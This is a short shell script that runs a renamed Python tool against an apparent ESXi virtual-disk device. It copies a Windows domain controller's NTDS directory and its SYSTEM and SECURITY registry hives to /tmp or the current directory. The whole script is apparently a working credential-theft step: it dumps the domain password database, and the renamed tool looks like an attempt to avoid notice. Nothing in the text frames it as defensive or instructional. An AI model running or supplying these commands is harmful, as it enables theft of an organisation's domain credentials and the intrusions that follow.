#!/bin/sh
/usr/local/bin/python3.12 renamed.py -d "/dev/disks/vml.changed:1" ls "changed-flat.vmdk:part4/Windows/NTDS" /tmp/ntds-copy
/usr/local/bin/python3.12 renamed.py -d "/dev/disks/vml.changed:1" ls "changed-flat.vmdk:part4/Windows/System32/config/SYSTEM" /tmp/hive
/usr/local/bin/python3.12 renamed.py -d "/dev/disks/vml.changed:1" ls "changed-flat.vmdk:part4/Windows/System32/config/SECURITY" ./
